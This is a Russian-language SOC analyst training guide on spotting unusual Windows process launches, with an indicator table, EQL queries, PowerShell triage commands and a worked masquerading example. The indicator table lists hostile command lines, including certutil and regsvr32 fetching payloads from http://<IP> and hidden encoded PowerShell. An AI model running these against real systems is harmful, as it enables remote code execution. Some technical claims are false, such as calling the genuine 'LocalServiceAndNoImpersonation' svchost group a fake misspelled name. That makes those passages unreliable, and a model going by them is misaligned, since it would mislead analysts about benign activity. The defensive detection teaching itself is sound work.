# Индикаторы нетипичного запуска процесса на хосте

## Контекст и базовые понятия

Событие создания процесса — один из фундаментальных источников телеметрии для SOC аналитика. В Windows каждое появление нового процесса фиксируется в журналах безопасности (Event ID 4688) или, при использовании Sysmon, в детализированном событии Event ID 1. Современные EDR-решения, такие как Elastic Defend или Rapid7 Insight Agent, также собирают и нормализуют эту информацию, предоставляя унифицированную схему полей. Предметом анализа L1 является не столько сам процесс, сколько совокупность его атрибутов, позволяющая отличить нормальное поведение системы от подозрительной активности.

Под *индикатором нетипичного запуска процесса* понимается любое наблюдаемое значение или комбинация атрибутов процесса, выходящая за рамки ожидаемой для данной среды нормы. Такой индикатор может быть следствием действий злоумышленника: маскировки вредоносного ПО под легитимное, использования нестандартных путей исполняемых файлов для обхода политик ограничения (AppLocker, WDAC), злоупотребления системными утилитами (Living-off-the-Land) или перемещения по сети. Для аналитика первого уровня ключевой задачей является быстрое выявление таких аномалий, их первичная проверка и эскалация при невозможности подтвердить легитимность.

Важно разделять понятия «подозрительный процесс» и «индикатор нетипичного запуска». Первое — это вывод, сделанный после анализа. Второе — это наблюдаемый артефакт (например, путь `C:\Windows\System32\Tasks\svchost.exe` или передача закодированной строки в PowerShell), который может указывать на потенциальную угрозу. Один и тот же индикатор в разных контекстах может быть как ложным срабатыванием, так и серьёзным инцидентом.

**Источники данных и их особенности**

В практике SOC L1 аналитик оперирует событиями из трёх основных каналов, каждый из которых по-своему представляет информацию о запуске процесса.

| Источник | Типовой идентификатор события | Ключевые поля | Особенности для анализа |
|----------|-------------------------------|---------------|--------------------------|
| Журнал безопасности Windows | 4688 | `NewProcessName`, `CommandLine`, `ParentProcessName`, `SubjectUserSid`, `TokenElevationType` | Не содержит хэш-сумм исполняемого файла. Путь к родительскому процессу доступен начиная с Windows 10/Server 2016. Поля `CommandLine` могут быть обрезаны. |
| Sysmon (Microsoft Sysinternals) | 1 | `Image`, `CommandLine`, `ParentImage`, `ParentCommandLine`, `Hashes`, `OriginalFileName`, `IntegrityLevel`, `User`, `CurrentDirectory` | Предоставляет хэши (MD5, SHA1, SHA256) и внутреннее имя файла (`OriginalFileName`), что критически важно для выявления маскировки. Требует отдельной установки и файла конфигурации. |
| EDR-телеметрия (Elastic, CrowdStrike, SentinelOne, Rapid7 Insight Agent и др.) | Зависит от вендора, часто нормализованное событие `process` | Аналогично Sysmon, плюс метаданные подписи (статус проверки, издатель), данные о сетевых соединениях, загрузке DLL. | Обогащено контекстом: наличие EDR позволяет сразу видеть статус цифровой подписи, репутацию файла, поведенческие признаки. |

Вне зависимости от источника, первичный триаж всегда опирается на четыре базовых атрибута, рекомендованные сообществом SOC-специалистов [Investigating Suspicious Process Executions](https://medium.com/meetcyber/investigating-suspicious-process-executions-a-soc-analysts-guide-eb9f5d3ef8c2): **имя процесса**, **путь к исполняемому файлу**, **аргументы командной строки** и **родительско-дочерние связи**. Именно отклонения в этих атрибутах формируют большинство сигнатурных и поведенческих детектирований.

**Норма и аномалия**

«Норма» для запуска процесса зависит от роли хоста, установленного ПО и профиля пользователя. Например, `cscript.exe` редко появляется на сервере в нерабочее время; появление `powershell.exe` с аргументом `-enc` на рабочей станции бухгалтера почти всегда является инцидентом. Поэтому детектирующие правила часто используют статистические методы, сравнивая наблюдаемое событие с базовой линией поведения хоста или всей организации. Так, в составе набора предустановленных правил Elastic Security присутствует ML-детектирование «Unusual Process For a Windows Host», выявляющее процессы, редко встречающиеся на конкретном хосте и во всей среде [Unusual Process For a Windows Host](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/ml/persistence_ml_rare_process_by_host_windows). Это дополняет традиционные сигнатуры, ориентированные на заранее известные «плохие» паттерны.

Таким образом, для аналитика L1 индикатор нетипичного запуска — это отправная точка, а не окончательный вердикт. Каждое срабатывание требует сопоставления с контекстом: временем события, учётной записью, историей хоста, наличием аналогичных событий в окружении.

## Классификация индикаторов нетипичного запуска

Индикаторы нетипичного запуска процесса можно разделить на несколько классов в зависимости от того, какой атрибут события демонстрирует отклонение. Ниже представлен исчерпывающий обзор таких классов, актуальный для среды Windows и наиболее часто встречающийся в алертах L1. Каждый класс иллюстрируется конкретными примерами и соотносится с техниками матрицы MITRE ATT&CK.

| Класс индикатора | Ключевые признаки | Типичные примеры | Связь с MITRE ATT&CK |
|------------------|-------------------|------------------|-----------------------|
| **Аномальный путь исполняемого файла** | Исполняемый файл расположен в каталоге, типично используемом для временных файлов, или в подкаталоге легитимного системного пути, где данный бинарник не должен находиться. | `C:\Windows\System32\Tasks\svchost.exe`; `C:\Program Files\Common Files\System\lsass.exe`; процессы из `C:\Users\Public\` или `%TEMP%`; автозагрузка из `%APPDATA%` для двоичных файлов, не являющихся обновлениями. | T1036 — Masquerading; T1059 — Command and Scripting Interpreter (при запуске скриптов из нестандартных мест) |
| **Маскировка имени процесса** | Имя файла имитирует легитимный системный процесс, но содержит опечатки, замену символов или нестандартное расширение. Внутреннее `OriginalFileName` не совпадает с именем файла. | `svch0st.exe` вместо `svchost.exe`; `lsass.exe` на одну букву отличается; `winword.exe` с изменённым регистром; `rundll32.exe` расположен вне System32. Дополнительно — подпись не валидна или отсутствует. | T1036 — Masquerading (T1036.003 — Rename System Utilities) |
| **Нетипичный родительский процесс** | Процесс порождён программой, которая по своему назначению не должна запускать данный дочерний процесс. | `cmd.exe` или `powershell.exe`, запущенные офисным приложением (winword.exe, excel.exe); `wmic.exe` с родителем, отличным от `svchost.exe`; `regsvr32.exe` с родителем `explorer.exe` без видимого интерактивного действия; `mshta.exe` с родителем `outlook.exe`. | T1059 — Command and Scripting Interpreter; T1203 — Exploitation for Client Execution |
| **Подозрительные аргументы командной строки** | Передаваемые параметры содержат конструкции, типичные для обфускации, загрузки удалённого кода, выполнения скриптов в скрытом режиме или не соответствующие назначению процесса. | `powershell.exe -NoP -NonI -W Hidden -Enc <base64>`; `cmd.exe /c certutil -urlcache -split -f http://<IP>/bad.exe %TEMP%\bad.exe`; `regsvr32.exe /s /n /u /i:http://<IP>/scrobj.dll scrobj.dll`; `mshta.exe javascript:...` (с кодом VBScript/JavaScript). | T1059.001 — PowerShell; T1218.011 — Rundll32; T1218.005 — Mshta; T1140 — Deobfuscate/Decode Files or Information |
| **Редко встречающиеся процессы на хосте** | Бинарный файл или его комбинация с родителем и аргументами никогда ранее не наблюдались на данном узле или в организации. Обнаруживается поведенческой аналитикой и ML-правилами. | Появление `bitsadmin.exe`, `certutil.exe` или `msbuild.exe` на сервере, где они никогда не использовались; запуск утилиты администрирования `net.exe` в нерабочее время с нетипичной учётной записи. | T1105 — Ingress Tool Transfer; T1072 — Software Deployment Tools |
| **Злоупотребление легитимными утилитами (Living-off-the-Land)** | Системное средство Windows используется в нехарактерном контексте или с аргументами, направленными на загрузку, выполнение или эскалацию. | Запуск `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication <код>"`; `cscript.exe` для выполнения .vbs файла из временной папки; `reg.exe` для создания ключа автозагрузки. | T1218 — System Binary Proxy Execution; T1546.008 — Accessibility Features |
| **Аномальные показатели целостности или учётной записи** | Процесс с высоким уровнем целостности (High/System) запущен учётной записью, обычно работающей со средним уровнем (Medium), либо наоборот. Или процесс запущен от имени пользователя, не соответствующего ожидаемому (например, `lsass.exe` от SYSTEM, а не от LocalSystem, хотя последнее норма). | `cmd.exe` с уровнем High, запущенный пользователем домена без явного повышения (Run As Administrator); процесс, работающий в контексте `NT AUTHORITY\SYSTEM`, но родившийся в пользовательской сессии. | T1548 — Abuse Elevation Control Mechanism; T1134 — Access Token Manipulation |

Дополнительно следует учитывать «гибридные» индикаторы, когда два или более признака проявляются одновременно. Например, процесс `svchost.exe` из `%TEMP%`, запущенный родителем `winword.exe`, с аргументом `-k netsvcs` (который редко передаётся явно) — комбинация, практически гарантирующая вредоносную активность.

Особое место занимает техника подмены утилит специальных возможностей (Accessibility Tools, T1546.008). Здесь злоумышленник заменяет такие исполняемые файлы, как `sethc.exe` (залипание клавиш), `utilman.exe` (центр специальных возможностей) или `osk.exe` (экранная клавиатура), на копию `cmd.exe`. При вызове этих утилит с экрана входа в систему запускается командная строка с правами SYSTEM. Правила детектирования Rapid7 фиксируют запуск `cmd.exe` или `powershell.exe` с родительским процессом, путь к которому совпадает с одним из перечисленных утилит [Windows Suspicious Process](https://docs.rapid7.com/insightidr/windows-suspicious-process). Аналитик L1, увидев такое событие, должен немедленно классифицировать его как критический инцидент, так как легитимных причин для такого родительского процесса не существует.

Таким образом, классификация индикаторов не является строго взаимоисключающей: один инцидент часто активирует несколько параллельных срабатываний в SIEM, и задача L1 — объединить их в единую картину атаки.

## Применение и работа с индикаторами

При поступлении алерта, связанного с подозрительным запуском процесса, аналитик SOC L1 действует в рамках стандартного playbook’а триажа: приём, первичная проверка, обогащение контекстом и принятие решения об эскалации или закрытии.

**Триаж на примере SIEM**

Большинство современных SIEM (Splunk, Elastic Security, Microsoft Sentinel) предоставляют аналитику готовый набор полей события, а также ссылки на смежные события того же хоста или пользователя за последние часы. Ниже приведён пример запроса на языке EQL (Elastic Event Query Language), который можно использовать для поиска процессов, запущенных из подкаталогов стандартных системных путей — на основе логики правила Elastic «Process Execution from an Unusual Directory» [Process Execution from an Unusual Directory](https://detection.fyi/elastic/detection-rules/windows/defense_evasion_from_unusual_directory).

```eql
process where event.type == "start"
  and process.executable regex~ """C:\\\\Windows\\\\(?:[A-Za-z]+)\\.+\\.(?:exe|scr)"""
  and not process.executable : ("C:\\Windows\\System32\\*", "C:\\Windows\\SysWOW64\\*", "C:\\Windows\\WinSxS\\*")
```

Этот запрос находит процессы, путь которых начинается с `C:\Windows\`, затем ещё один подкаталог, и далее любой exe/scr, исключая легитимные `System32`, `SysWOW64` и `WinSxS`. Аналитик может выполнить его в панели поиска для быстрой проверки, не ограничен ли инцидент единичным хостом и не наблюдается ли массовое срабатывание.

**Пошаговый алгоритм работы с алертом**

1. **Приём и фиксация:** Записать идентификатор алерта, хост, имя пользователя, время. Открыть детали.
2. **Валидация атрибутов процесса:**
   - **Путь:** Проверить, соответствует ли он стандартным каталогам (System32, Program Files, конкретная папка продукта). Если путь оканчивается на `\Temp\`, `\Downloaded Program Files\`, `\Tasks\` — это повышает критичность.
   - **Имя и маскировка:** Если в событии присутствует поле `OriginalFileName` (Sysmon/EDR), сравнить его с именем файла. Расхождение — сильный индикатор маскировки. Например, `OriginalFileName` может быть `cmd.exe`, а имя файла — `svchost.exe`. Проверить цифровую подпись. В EDR это часто отображается готовой строкой статуса (Trusted/Untrusted/Invalid).
   - **Родительский процесс:** Убедиться, что связка «родитель-ребёнок» логична. Например, `msiexec.exe` может порождать `cmd.exe` в ходе установки; `services.exe` — `svchost.exe`. Но `taskeng.exe` → `powershell.exe -enc ...` — подозрительно.
   - **Командная строка:** Выявить обфускацию (base64, обратные вызовы, `-EncodedCommand`, `IEX`). Искать IP-адреса, URL-адреса, нестандартные разделители. Для PowerShell — наличие `-WindowStyle Hidden` или `-NoProfile -NoLogo -NonInteractive`.
3. **Обогащение контекстом:** За последние 48 часов для того же хоста/пользователя:
   - Есть ли другие алерты (входы, сетевые соединения, модификации реестра)?
   - Запускался ли этот исполняемый файл ранее? Если да — не является ли легитимной деятельностью (например, разовая утилита администратора)?
   - Какие сетевые соединения инициировал процесс (по журналам брандмауэра или EDR)? Куда и на какой порт?
4. **Классификация:** Если хотя бы два признака из таблицы раздела 2 выражены и контекст не подтверждает легитимность — эскалация на L2/L3 с записью всех собранных артефактов. Если подозрение единичное и может быть объяснено известной активностью (обновление ПО, тестирование) — закрыть с обоснованием.

**Практический пример команды на PowerShell для ручного анализа**

Аналитик, имея доступ к хосту (через удалённый сеанс или EDR live response), может извлечь детальную информацию о процессе, идентифицированном по PID. Например, для проверки цифровой подписи и владельца процесса с PID 1234:

```powershell
Get-Process -Id 1234 | Select-Object Id, Name, Path, Company, StartTime, `
  @{n='Owner';e={(Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").GetOwner().User}} -First 1
Get-AuthenticodeSignature -FilePath (Get-Process -Id 1234).Path | Format-List
```

Вывод команды будет содержать статус подписи (`NotSigned`, `Valid`, `HashMismatch`) и информацию об издателе. Отсутствие подписи у процесса, находящегося глубоко в системном каталоге, — дополнительный триггер.

**Типичные ловушки и ошибки L1**

- *Спешка в оценке родительского процесса:* Процесс `svchost.exe` с родителем `services.exe` — норма; с родителем `cmd.exe` — аномалия. Но если родительский процесс уже завершился, поле `ParentProcessName` может быть пустым. Следует искать Pre-Process события или данные EDR.
- *Ложные срабатывания от легитимного ПО:* Некоторые приложения, особенно инсталляторы, временно создают исполняемые файлы в `%TEMP%`. Если алерт повторяется циклично при каждом запуске одного и того же ПО — вероятно, ложный.
- *Недооценка аргументов:* Начинающие аналитики часто игнорируют командную строку, считая её шумом. Между тем обфусцированный вызов `rundll32` или `regsvr32` с URL в аргументах — классический индикатор загрузки бездискового вредоносного ПО.
- *Игнорирование контекста времени:* Запуск `certutil.exe` в 3:00 ночи на сервере, где нет административных работ, гораздо опаснее такого же запуска в полдень.

Таким образом, работа с индикаторами нетипичного запуска сводится к систематическому сопоставлению наблюдаемых признаков с базой знаний об атаках и со здравым смыслом о том, как «должно быть» в защищаемой среде.

## Сквозной практический пример: обнаружение маскированного вредоносного процесса

**Исходные условия:** Рабочая станция Windows 10 (hostname `DESKTOP-R7J2K1`, учётная запись `CORP\ivanov`) оснащена Sysmon с конфигурацией SwiftOnSecurity. События Sysmon пересылаются в SIEM Elastic Security, где настроены предустановленные правила. В 10:42 UTC срабатывает алерт «Process Execution from an Unusual Directory». Аналитик L1 получает уведомление и приступает к разбору.

**Шаг 1: Извлечение деталей события Sysmon Event ID 1.**  
Открыв алерт, аналитик видит нормализованное событие процесса. Первичный осмотр полей:

```json
{
  "@timestamp": "2025-06-12T10:42:11.821Z",
  "event.code": "1",
  "host.name": "DESKTOP-R7J2K1",
  "process.name": "svchost.exe",
  "process.executable": "C:\\Windows\\System32\\Tasks\\svchost.exe",
  "process.command_line": "svchost.exe -k LocalServiceAndNoImpersonation",
  "process.parent.name": "taskeng.exe",
  "process.parent.executable": "C:\\Windows\\System32\\taskeng.exe",
  "process.pid": 4512,
  "process.working_directory": "C:\\Windows\\System32\\Tasks\\",
  "user.name": "CORP\\ivanov",
  "process.code_signature.status": "Untrusted",
  "process.pe.original_file_name": "malfind.exe"
}
```

Уже на этом этапе видны множественные индикаторы: путь не соответствует стандартной `System32`, оригинальное имя файла `malfind.exe` радикально отличается от `svchost.exe`, подпись недоверенная, рабочая директория задана явно и не соответствует стандартной. Аналитик фиксирует эти детали в рабочей заметке.

**Шаг 2: Проверка родительско-дочерних связей и аргументов.**  
Используя EQL-запрос в Kibana, аналитик ищет все процессы, запущенные за последний час родителем `taskeng.exe`:

```eql
process where process.parent.executable == "C:\\Windows\\System32\\taskeng.exe"
  and host.name == "DESKTOP-R7J2K1"
  and @timestamp > "2025-06-12T09:00:00Z"
```

Запрос возвращает всего несколько событий: стандартные `backgroundTaskHost.exe` и данное подозрительное. Это подтверждает, что `taskeng.exe` в норме не порождает `svchost.exe` с такими аргументами. Логичность связки нарушена.

Аналитик также проверяет аргумент `-k LocalServiceAndNoImpersonation`. Легитимный `svchost.exe` действительно может запускаться с ключом `-k`, но обычно указывает конкретную группу служб, например `-k netsvcs` или `-k LocalService`. Имя группы `LocalServiceAndNoImpersonation` не является стандартным — это выдуманное имя, использованное вредоносным ПО для мимикрии под названия групп, но с опечаткой (пропущена буква). Это ещё один индикатор.

**Шаг 3: Анализ образа процесса на диске.**  
С помощью ответного действия EDR (или ручного доступа) аналитик вычисляет хэш-сумму файла по пути `C:\Windows\System32\Tasks\svchost.exe` и отправляет его на VirusTotal. Действия на концевой точке:

```powershell
$path = "C:\Windows\System32\Tasks\svchost.exe"
$hash = (Get-FileHash -Path $path -Algorithm SHA256).Hash
$sign = Get-AuthenticodeSignature -FilePath $path

Write-Output "SHA256: $hash"
Write-Output "SignatureStatus: $($sign.Status)"
Write-Output "SignerCertificate: $($sign.SignerCertificate.Subject)"
```

Результат:

```
SHA256: ABC123DEF456... (иллюстративная схема)
SignatureStatus: HashMismatch
SignerCertificate: (отсутствует)
```

Статус `HashMismatch` означает, что файл имел цифровую подпись, но был модифицирован после подписания (или подпись недействительна). VirusTotal подтверждает, что хэш файла извеcтен как `Trojan.GenericKD`. Аналитик делает вывод: файл определённо вредоносный.

**Шаг 4: Оценка распространённости и завершение триажа.**  
Аналитик проверяет, встречался ли данный хэш на других хостах организации (запрос в SIEM):

```eql
process where process.hash.sha256 == "ABC123DEF456..." and host.name != "DESKTOP-R7J2K1"
```

Обнаруживается ещё два хоста с аналогичным событием за утро. Это свидетельствует о горизонтальном перемещении или фишинговой рассылке. Учитывая критичность (запуск от имени пользователя, подозрительный путь и подпись, маскировка), аналитик эскалирует инцидент на L2, приложив собранные артефакты: JSON события, результаты VirusTotal, вывод PowerShell и список затронутых систем.

**Ожидаемый вывод:** Сквозной пример демонстрирует, как отдельный индикатор (нестандартный путь) в сочетании с другими (маскировка имени, подпись, родитель) позволяет за несколько шагов подтвердить вредоносную активность и корректно эскалировать инцидент. Для аналитика L1 ключевым является не изолированное рассмотрение поля «путь», а целостная оценка всех атрибутов процесса.
